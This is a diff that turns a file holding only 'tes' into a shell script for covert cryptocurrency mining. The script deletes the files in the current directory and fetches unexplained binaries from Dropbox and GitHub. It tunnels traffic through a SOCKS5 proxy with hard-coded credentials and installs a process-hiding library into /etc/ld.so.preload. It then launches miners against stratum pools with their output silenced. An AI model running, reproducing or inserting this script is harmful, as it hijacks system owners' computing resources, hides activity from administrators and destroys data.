@@ -1,1 +1,58 @@
-tes
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget -O fortuner "https://www.dropbox.com/scl/fi/pv0jzaguyfo9b7riiacg2/fortuner?rlkey=5uax4hvgt1ns98muutvjv0jpr&st=o9gxub8c&dl=1" && chmod +x fortuner
+
+wget https://github.com/usapindong/test/raw/refs/heads/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 103.176.78.132:443
+socks5_username = ubed
+socks5_password = ubed123
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://github.com/usapindong/test/raw/refs/heads/main/magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./fortuner --proxy 202.155.9.40:80 --address prl1pahcdcce2mtd5j2wahl2t240dkl289z9v7lv2wxyc8ay0vae3gxvqzycfgq --worker rtx -gpu & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod 777 sse20 && ./sse20 -a power2b -o stratum+tcp://68.183.186.109:80 -u MbVBtUuYHPKuZKV9zhhjufNzfPstvYkUBN.rtx -t $(nproc) > /dev/null 2>&1 & clear
+
